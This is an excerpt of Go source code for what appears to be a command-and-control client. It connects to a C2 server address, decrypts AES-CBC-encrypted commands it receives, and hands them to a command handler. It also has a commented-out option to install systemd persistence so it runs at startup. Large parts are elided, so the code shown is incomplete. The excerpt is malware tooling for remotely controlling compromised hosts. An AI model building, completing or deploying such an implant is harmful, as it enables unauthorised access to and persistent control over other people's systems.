...
const (
	C2Address = "127.0.0.1:44444" // C2 server address and port

	// AES encryption key and initialization vector (replace with your own values)
...
func main() {
	...
	//go SystemdPersistence()            // un-Comment this to Execute the SystemdPersistence function to run at the start of the client
	...
	for {
		...
		for scanner.Scan() {
			...
			decryptedString, err := decryptData(encryptedString)
			if err != nil {
				fmt.Println("Error decrypting data:", err)
				continue
			}
			fmt.Println("Decrypted data:", decryptedString)

			if err := handleCommand(decryptedString); err != nil {
...
// handleCommand handles the decrypted command received from the C2 server
...
// decryptData decrypts the base64-encoded encrypted string using AES-CBC
func decryptData(encrypted string) (string, error) {
	...
	decryptedBytes := PKCS5Unpad(encryptedBytes)
	return string(decryptedBytes), nil
}

// PKCS5Unpad removes PKCS#5 padding from the decrypted data
